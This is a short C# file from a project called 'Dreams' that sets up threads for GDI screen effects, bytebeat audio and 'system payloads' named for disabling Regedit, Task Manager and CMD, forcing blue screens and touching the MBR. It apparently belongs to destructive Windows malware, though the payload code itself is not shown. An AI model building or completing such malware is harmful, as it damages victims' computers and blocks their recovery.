using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using static Dreams.ByteBeats;
using static Dreams.GDI;
using static Dreams.SystemPayloads;



namespace Dreams
{
    public class Threads
    {
        // GDI

        public static Thread text = new Thread(TextPayload);
        public static Thread gdi1 = new Thread(GDI1);
        public static Thread gdi2 = new Thread(GDI2);
        public static Thread gdi3 = new Thread(GDI3);
        public static Thread gdi4 = new Thread(GDI4);
        public static Thread gdi5 = new Thread(GDI5);
        public static Thread gdi6 = new Thread(GDI6);
        public static Thread gdi7 = new Thread(GDI7);
        public static Thread payload2 = new Thread(InvertForms);
        public static Thread payload1 = new Thread(Payload1);
        // ByteBeats

        public static Thread bytebeat1 = new Thread(Bytebeat1);
        public static Thread bytebeat2 = new Thread(Bytebeat2);
        public static Thread bytebeat3 = new Thread(Bytebeat3);
        public static Thread bytebeat4 = new Thread(Bytebeat4);

        // SystemPayloads

        public static Thread tRegedit = new Thread(DisableRegedit);
        public static Thread tTaskMGR = new Thread(DisableTaskMGR);
        public static Thread tCMD = new Thread(DisableCMD);
        public static Thread tBSOD = new Thread(BSOD);
        public static Thread tMBR = new Thread(MBR);
        public static Thread tBSODAoIniciarWindows = new Thread(TelaAzulAoIniciarOWindows);
    }
}
